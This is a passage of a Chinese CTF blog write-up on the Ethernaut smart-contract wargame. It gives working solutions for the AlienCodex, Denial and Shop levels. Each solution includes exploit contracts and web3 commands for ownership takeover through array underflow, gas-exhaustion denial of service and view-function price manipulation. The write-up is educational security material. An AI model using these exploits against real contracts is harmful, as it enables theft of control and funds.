</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;<span class="built_in">console</span>.info(y)&#125;);</span><br><span class="line"><span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>但是无论调用题目合约哪个函数，都要满足 <code>modifier contacted()</code> ，所以要先使 <code>contact=true</code> ，也就是要先解决 <code>make_contact</code> 这个问题</li>
</ul>
<h2 id="Solution-18"><a href="#Solution-18" class="headerlink" title="Solution"></a>Solution</h2><p>1、先看 <code>make_contact</code> 函数，我们需要传人一个 <code>length&gt;2^200</code> 的数组，<strong>OPCODE</strong> 中数组长度是存储在某个 <code>slot</code> 上的，并且没有对数组长度和数组内的数据做校验，所以可以构造一个存储位上长度很大，但实际上并没有数据的数组，打包成 <code>data</code> 发送<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sig = web3.sha3(<span class="string">"make_contact(bytes32[])"</span>).slice(<span class="number">0</span>,<span class="number">10</span>)     <span class="comment">// 函数id</span></span><br><span class="line"><span class="comment">// "0x1d3d4c0b"</span></span><br><span class="line">data1 = <span class="string">"0000000000000000000000000000000000000000000000000000000000000020"</span> <span class="comment">//偏移，指的是除了函数id，数组内容开始的位置，在这里我们设置的是offset=32</span></span><br><span class="line"><span class="comment">// 除去函数选择器，数组长度的存储从第 0x20 位开始</span></span><br><span class="line">data2 = <span class="string">"1000000000000000000000000000000000000000000000000000000000000001"</span> <span class="comment">//length&gt;2^200</span></span><br><span class="line"><span class="comment">// 数组的长度</span></span><br><span class="line"><span class="keyword">await</span> contract.contact()</span><br><span class="line"><span class="comment">// false</span></span><br><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: sig + data1 + data2&#125;);</span><br><span class="line"><span class="comment">// 发送交易</span></span><br><span class="line"><span class="keyword">await</span> contract.contact()</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/31.png" alt></p>
<p>2、计算 <span id="inline-purple">codex</span> 位置为 <strong>slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</strong> </p>
<ul>
<li>所以 <strong>y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0</strong></li>
<li>即 <strong>y = 35707666377435648211887908874984608119992236509074197713628505308453184860938</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract codex &#123;</span><br><span class="line"></span><br><span class="line">    function cal() view returns(bytes32)&#123;</span><br><span class="line">        return keccak256((bytes32(1)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3、可以看到 <strong>y = 35707666377435648211887908874984608119992236509074197713628505308453184860938</strong> 很大，而 <code>codex.length=0(见Analyse)</code> 很小，我们通过 <code>retract()</code> 使得 <span id="inline-purple">codex</span> 数组 <code>length</code> 下溢，使其满足 <strong>y &lt; codex.length</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(instance, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;<span class="built_in">console</span>.info(y)&#125;); <span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">contract.retract()</span><br><span class="line"><span class="comment">// codex.length--</span></span><br><span class="line"></span><br><span class="line">web3.eth.getStorageAt(instance, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;<span class="built_in">console</span>.info(y)&#125;); <span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/32.png" alt></p>
<p>4、由2和3已经计算出 <strong>codex[35707666377435648211887908874984608119992236509074197713628505308453184860938]</strong> 对应的存储位就是 <strong>slot 0</strong> ，在 <code>Analyse</code> 中提到 <strong>slot 0</strong> 中同时存储了 <code>contact</code> 和 <span id="inline-blue">owner</span> ，我们只需将 <span id="inline-blue">owner</span> 换成 <span id="inline-green">player</span> 地址即可<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// "0x73048cec9010e92c298b016966bde1cc47299df5"</span></span><br><span class="line">player</span><br><span class="line"><span class="comment">// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"</span></span><br><span class="line">contract.revise(<span class="string">'35707666377435648211887908874984608119992236509074197713628505308453184860938'</span>,<span class="string">'0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2'</span>)</span><br><span class="line"><span class="comment">// 调用 revise()</span></span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"</span></span><br><span class="line"><span class="comment">// Submit instance</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/33.png" alt><br><br></p>
<h1 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h1><h2 id="Require-20"><a href="#Require-20" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</code></li>
<li><code>If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level.</code></li>
<li>结合代码看了一下，要求就是在调用 <code>withdraw</code> 时，禁止 <code>owner</code> 转走账户的 <code>1%</code> 的余额</li>
</ul>
<h2 id="Source-20"><a href="#Source-20" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address public constant owner = <span class="number">0xA9E</span>;</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance.div(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)();</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-20"><a href="#Analyse-20" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>可以使 <code>transfer</code> 失败，也就是把 <code>gas</code> 耗光</li>
<li>使用 <code>assert</code> 失败的话，将会 <code>spend all gas</code> ，这样的话 <code>owner.transfer(amountToSend)</code> 将执行失败</li>
<li>这里还有一个很明显的重入漏洞 <code>partner.call.value(amountToSend)()</code> ，利用重入漏洞把 <code>gas</code> 消耗完，应该也可以达到目的（自行尝试）</li>
</ul>
<h2 id="Solution-19"><a href="#Solution-19" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address public constant owner = <span class="number">0xA9E</span>;</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance/<span class="number">100</span>;</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)();</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address instance_address = <span class="number">0xe6cdb72d9fec660b78eb2390ffa67ab61b766e51</span>;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack1</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="keyword">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        assert(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接调用 <code>hack1()</code> 即可<br><br></p>
<h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><h2 id="Require-21"><a href="#Require-21" class="headerlink" title="Require"></a>Require</h2><ul>
<li>题目意思是修改 <code>price</code> 小于 <code>100</code></li>
<li>（不过这个题目好像下线了23333）</li>
</ul>
<h2 id="Source-21"><a href="#Source-21" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity <span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Shop</span> </span>&#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-21"><a href="#Analyse-21" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>本来想的是利用 <code>storage</code> 修改，可是修改变量需要 <strong>5000 gas</strong>，但是我们只有 <strong>3000</strong></li>
<li>所以需要另想办法，发现 <code>isSold</code> 是 <code>public</code> 属性，所以可以利用 <code>isSold</code> ，根据 <code>isSold</code> 进行判断，两次调用 <code>_buyer.price.gas(3000)()</code> 第一次返回大于等于 <code>100</code> ，第二次返回小于 <code>100</code> 即可</li>
</ul>
<h2 id="Solution-20"><a href="#Solution-20" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity <span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Shop</span> </span>&#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Shop target = Shop(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> target.isSold() == <span class="literal">true</span> ? <span class="number">99</span> : <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接调用 <code>attack()</code> 即可<br><br></p>
<p id="div-border-left-red"><strong>Reference</strong><br><a href="http://mitah.cn/index.php/archives/14/" rel="external nofollow noopener noreferrer" target="_blank">http://mitah.cn/index.php/archives/14/</a><br><a href="https://f3real.github.io/Ethernaut_wargame2022.html#lvl-21-denial" rel="external nofollow noopener noreferrer" target="_blank">https://f3real.github.io/Ethernaut_wargame2022.html#lvl-21-denial</a><br><a href="https://www.codercto.com/a/38161.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.codercto.com/a/38161.html</a><br><a href="https://www.secpulse.com/archives/73682.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.secpulse.com/archives/73682.html</a><br><a href="https://www.anquanke.com/post/id/148341#h2-12" rel="external nofollow noopener noreferrer" target="_blank">https://www.anquanke.com/post/id/148341#h2-12</a><br><a href="https://xz.aliyun.com/t/2856#toc-4" rel="external nofollow noopener noreferrer" target="_blank">https://xz.aliyun.com/t/2856#toc-4</a><br><a href="https://blog.riskivy.com/智能合约ctf：ethernaut-writeup-part-4/" rel="external nofollow noopener noreferrer" target="_blank">https://blog.riskivy.com/智能合约ctf：ethernaut-writeup-part-4/</a><br><a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" rel="external nofollow noopener noreferrer" target="_blank">https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</a></p>

      <script>
        window.disqusProxy={
          shortname: 'undefined',
          username: 'pikachu',
          server: 'undefined',
          port: 5509,
          adminAvatar: '/avatars/admin-avatar.jpg',
          identifier: '2019/ethernaut/',
        };
        window.disqus_config = function () {
          this.page.url = window.location.href;
          this.page.identifier = window.disqusProxy.identifier;
        };
      </script>
      
    </div>

<div style="text-align:center;color: #ccc;font-size:14px;">---------------- The End ----------------</div>

    <div>
      
        

      
    </div>

    <div>
      
        


  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
    <div>谢谢大爷～</div>
    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
      <span>赏</span>
    </button>
    <div id="QR" style="display: none;">
      
        <div id="wechat" style="display: inline-block">
          <img id="wechat_qr" src="/images/donate/wechat.png" alt="pikachu WeChat Pay">
          <p>微信打赏</p>
        </div>
      
      
        <div id="alipay" style="display: inline-block">
          <img id="alipay_qr" src="/images/donate/alipay.jpg" alt="pikachu Alipay">
          <p>支付宝打赏</p>
        </div>
      
    </div>
  </div>


      
    </div>
<div>
	  
	    <p id="div-border-left-red">
		Author：<b>pikachu</b><br>
		Link：<a href="/2019/ethernaut/" title="Ethernaut -- Smart Contract">https://hitcxy.com/2019/ethernaut/</a><br>
		Contact：<a>hitcxy@hotmail.com</a><br>
	   <b>本文基于<a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/" rel="external nofollow noopener noreferrer"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布</b><br>
	    <b>转载请注明出处，谢谢！</b>
	    </p>
	  
	</div>


    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Solidity/" rel="tag"><i class="fa fa-tag"></i> Solidity</a>
          
            <a href="/tags/Smart-Contract/" rel="tag"><i class="fa fa-tag"></i> Smart Contract</a>
          
            <a href="/tags/Ethernaut/" rel="tag"><i class="fa fa-tag"></i> Ethernaut</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/h4ck/" rel="next" title="N1CTF2019 h4ck">
                <i class="fa fa-chevron-left"></i> N1CTF2019 h4ck
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/jojo/" rel="prev" title="数字经济2019 jojo">
                数字经济2019 jojo <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar/1.jpg" alt="pikachu">
          <p class="site-author-name" itemprop="name">pikachu</p>
          <p class="site-description motion-element" itemprop="description">帅 | 码渣 | 宅 | 金木粉</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">46</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">11</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">64</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/hitcxy" target="_blank" rel="external nofollow noopener noreferrer" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow noopener noreferrer">
              <img src="/images/cc-by-sa.svg" alt="Creative Commons">
            </a>
          </div>
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-block">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              参考的博客
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://yangbingdong.com/" title="ookamiAntD" target="_blank" rel="external nofollow noopener noreferrer">ookamiAntD</a>
                </li>
              
            </ul>
          </div>
        

        <div id="days"></div>
    <script>
    function show_date_time(){
        window.setTimeout("show_date_time()", 1000);
        BirthDay=new Date("09/16/2019 21:51:10");
        today=new Date();
        timeold=(today.getTime()-BirthDay.getTime());
        sectimeold=timeold/1000
        secondsold=Math.floor(sectimeold);
        msPerDay=24*60*60*1000
        e_daysold=timeold/msPerDay
        daysold=Math.floor(e_daysold);
        e_hrsold=(e_daysold-daysold)*24;
        hrsold=setzero(Math.floor(e_hrsold));
        e_minsold=(e_hrsold-hrsold)*60;
        minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
        seconds=setzero(Math.floor((e_minsold-minsold)*60));
        document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
    }
function setzero(i){
    if (i<10)
    {i="0" + i};
    return i;
}
show_date_time();
</script>


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hello-Ethernaut"><span class="nav-number">1.</span> <span class="nav-text">Hello Ethernaut</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fallback"><span class="nav-number">2.</span> <span class="nav-text">Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require"><span class="nav-number">2.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source"><span class="nav-number">2.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyse"><span class="nav-number">2.3.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">2.4.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fallout"><span class="nav-number">3.</span> <span class="nav-text">Fallout</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Require-1"><span class="nav-number">3.1.</span> <span class="nav-text">Require</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-1"><span class="nav-number">3.2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a 